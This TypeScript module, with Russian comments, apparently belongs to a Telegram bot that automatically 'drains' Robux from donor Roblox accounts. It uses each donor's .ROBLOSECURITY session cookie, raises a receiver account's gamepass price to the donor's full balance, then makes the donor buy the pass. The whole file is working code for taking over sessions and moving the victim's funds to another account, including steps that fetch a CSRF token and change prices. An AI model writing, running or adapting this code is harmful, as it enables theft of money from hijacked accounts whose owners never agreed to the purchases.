/**
 * Механика «слива» остатка донора в аккаунт-приёмник — порт из
 * src/app/api/twa/drain/route.ts (эндпоинт смены цены верифицирован вживую
 * 2026-07-03: universe-scoped PATCH, multipart/form-data, 204).
 *
 * Поток: баланс донора → выставить цену геймпасса приёмника = балансу →
 * дождаться, пока Roblox отразит цену → донор покупает геймпасс. Остаток
 * консолидируется у приёмника (минус стандартные 30% маркетплейса).
 *
 * Используется автослив-воркером (bots/tg/auto-workers.ts). Ручной слив
 * остаётся в TWA — там свой экземпляр той же механики.
 */

import { browserFailureMessage, getBrowserGamepassPreflight, getBrowserSession, purchaseGamepassInBrowser } from "./browser-purchase";

const ROBLOX_UA = { "User-Agent": "Roblox/WinInet", Accept: "application/json" };

export interface DrainOutcome {
  success: boolean;
  msg: string;
  drained?: number;
  gamepassId?: string;
  donorBalanceAfter?: number | null;
  drainBalanceAfter?: number | null;
}

export async function drainAuthedUser(cookie: string): Promise<{ id: number; name: string } | null> {
  try {
    const r = await fetch("https://users.roblox.com/v1/users/authenticated", {
      headers: { ...ROBLOX_UA, Cookie: `.ROBLOSECURITY=${cookie}` },
      signal: AbortSignal.timeout(10_000),
    });
    if (!r.ok) return null;
    const d: any = await r.json().catch(() => null);
    return d?.id ? { id: d.id, name: d.name ?? d.displayName ?? "?" } : null;
  } catch { return null; }
}

export async function drainCurrency(cookie: string): Promise<number | null> {
  try {
    const r = await fetch("https://economy.roblox.com/v1/user/currency", {
      headers: { ...ROBLOX_UA, Cookie: `.ROBLOSECURITY=${cookie}` },
      signal: AbortSignal.timeout(8_000),
    });
    if (!r.ok) return null;
    const d: any = await r.json().catch(() => null);
    return d?.robux ?? null;
  } catch { return null; }
}

async function productInfo(gpId: string): Promise<any | null> {
  const urls = [
    `https://apis.roblox.com/game-passes/v1/game-passes/${gpId}/product-info`,
    `https://apis.roproxy.com/game-passes/v1/game-passes/${gpId}/product-info`,
  ];
  for (const url of urls) {
    try {
      const r = await fetch(url, { headers: ROBLOX_UA, signal: AbortSignal.timeout(8_000) });
      if (r.ok) return await r.json();
    } catch { /* try next */ }
  }
  return null;
}

/** Геймпассы приёмника (кандидаты на слив). */
export async function drainUserGamepasses(userId: number, cookie: string): Promise<{ gamepassId: string; name: string }[]> {
  try {
    const r = await fetch(`https://apis.roblox.com/game-passes/v1/users/${userId}/game-passes?count=50`, {
      headers: { ...ROBLOX_UA, Cookie: `.ROBLOSECURITY=${cookie}` },
      signal: AbortSignal.timeout(10_000),
    });
    if (!r.ok) return [];
    const d: any = await r.json().catch(() => null);
    const arr = Array.isArray(d?.gamePasses) ? d.gamePasses : [];
    return arr.map((g: any) => ({ gamepassId: String(g.gamePassId), name: g.name ?? "Gamepass" }));
  } catch { return []; }
}

/**
 * Владеет ли юзер геймпассом. Грабли «один пасс = один слив на донора»:
 * Roblox не даёт купить пасс повторно, поэтому автослив выбирает пасс,
 * которым донор ещё НЕ владеет. null = проверка не удалась (пасс пропускаем).
 */
export async function ownsGamepass(userId: number, gpId: string): Promise<boolean | null> {
  try {
    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/GamePass/${gpId}`, {
      headers: ROBLOX_UA, signal: AbortSignal.timeout(8_000),
    });
    if (!r.ok) return null;
    const d: any = await r.json().catch(() => null);
    return Array.isArray(d?.data) ? d.data.length > 0 : null;
  } catch { return null; }
}

async function getCsrf(cookie: string): Promise<string | null> {
  const r = await fetch("https://auth.roblox.com/v2/logout", {
    method: "POST",
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    signal: AbortSignal.timeout(10_000),
  }).catch(() => null);
  return r?.headers.get("x-csrf-token") ?? null;
}

async function resolveUniverse(cookie: string, gpId: string): Promise<number | null> {
  let placeId: number | undefined;
  try {
    const r = await fetch(`https://apis.roblox.com/game-passes/v1/game-passes/${gpId}/details`, {
      headers: { ...ROBLOX_UA, Cookie: `.ROBLOSECURITY=${cookie}` },
      signal: AbortSignal.timeout(10_000),
    });
    if (r.ok) placeId = ((await r.json()) as any)?.placeId;
  } catch { /* fall through */ }
  if (!placeId) return null;
  try {
    const r = await fetch(`https://apis.roblox.com/universes/v1/places/${placeId}/universe`, {
      headers: ROBLOX_UA, signal: AbortSignal.timeout(10_000),
    });
    if (r.ok) return ((await r.json()) as any)?.universeId ?? null;
  } catch { /* fall through */ }
  return null;
}

/** Смена цены: universe-scoped PATCH, ТОЛЬКО multipart/form-data (JSON → 415). */
async function setGamepassPrice(cookie: string, csrf: string, gpId: string, price: number): Promise<{ ok: boolean; detail: string }> {
  const universeId = await resolveUniverse(cookie, gpId);
  if (!universeId) return { ok: false, detail: "universeId геймпасса не получен" };

  const fd = new FormData();
  fd.append("IsForSale", String(price > 0));
  fd.append("Price", String(Math.floor(price)));

  let status = 0, body = "";
  try {
    const r = await fetch(`https://apis.roblox.com/game-passes/v1/universes/${universeId}/game-passes/${gpId}`, {
      method: "PATCH",
      headers: { Cookie: `.ROBLOSECURITY=${cookie}`, "X-CSRF-TOKEN": csrf },
      body: fd,
      signal: AbortSignal.timeout(12_000),
    });
    status = r.status;
    body = (await r.text().catch(() => "")).slice(0, 200);
    if (r.ok) return { ok: true, detail: String(status) };
  } catch (e: any) {
    body = String(e?.message ?? e).slice(0, 120);
  }
  return { ok: false, detail: `[${status}] ${body}` };
}

/**
 * Полный слив: цена пасса приёмника = баланс донора → поллинг цены →
 * покупка донором. Возвращает честный исход; ничего не пишет в БД —
 * DrainEvent/алерты — на вызывающей стороне.
 */
export async function runDrain(donorCookie: string, drainCookie: string, gpId: string): Promise<DrainOutcome> {
  const donorSession = await getBrowserSession(donorCookie);
  const target = donorSession.session?.balance ?? null;
  if (!donorSession.ok || target === null)
    return { success: false, msg: browserFailureMessage(donorSession.reason, donorSession.code) };
  if (target < 1) return { success: false, msg: "Нечего сливать (баланс донора 0)" };

  const info = await productInfo(gpId);
  if (!info?.ProductId) return { success: false, msg: "product-info геймпасса недоступен" };
  const productId = info.ProductId as number;
  const sellerId = info.Creator?.Id ?? info.Creator?.CreatorTargetId ?? 0;
  if (!sellerId) return { success: false, msg: "Не удалось определить продавца геймпасса" };

  const preflight = await getBrowserGamepassPreflight(donorCookie, gpId);
  if (!preflight.ok) return { success: false, msg: browserFailureMessage(preflight.reason, preflight.code) };
  if (preflight.gamepass?.owned === true)
    return { success: false, msg: "Донор уже владеет этим геймпассом — нужен другой пасс приёмника" };

  const drainCsrf = await getCsrf(drainCookie);
  if (!drainCsrf) return { success: false, msg: "CSRF приёмника не получен — cookie протух?" };

  const priceRes = await setGamepassPrice(drainCookie, drainCsrf, gpId, target);
  if (!priceRes.ok) return { success: false, msg: `Не удалось сменить цену геймпасса (${priceRes.detail})` };

  // Roblox отражает новую цену с задержкой — поллим до ~15 с.
  let priced = false;
  for (let i = 0; i < 12; i++) {
    await new Promise((r) => setTimeout(r, 1200));
    const chk = await productInfo(gpId);
    if ((chk?.PriceInRobux ?? -1) === target && chk?.IsForSale) { priced = true; break; }
  }
  if (!priced) return { success: false, msg: "Цена сменена, но не подтвердилась за ~15с. Повторим следующим тиком." };

  const purchase = await purchaseGamepassInBrowser({
    cookie: donorCookie,
    gamepassId: gpId,
    productId,
    expectedPrice: target,
    sellerId,
    buyerUserId: donorSession.session!.accountId,
  });
  const donorAfter = purchase.balanceAfter ?? purchase.balanceBefore ?? null;
  const drainAfter = await drainCurrency(drainCookie);

  if (purchase.purchased) {
    return {
      success: true,
      msg: `Слито ${purchase.price ?? target} R$`,
      drained: purchase.price ?? target,
      gamepassId: gpId,
      donorBalanceAfter: donorAfter,
      drainBalanceAfter: drainAfter,
    };
  }

  return {
    success: false,
    msg: browserFailureMessage(purchase.reason, purchase.code),
    donorBalanceAfter: donorAfter,
    drainBalanceAfter: drainAfter,
  };
}
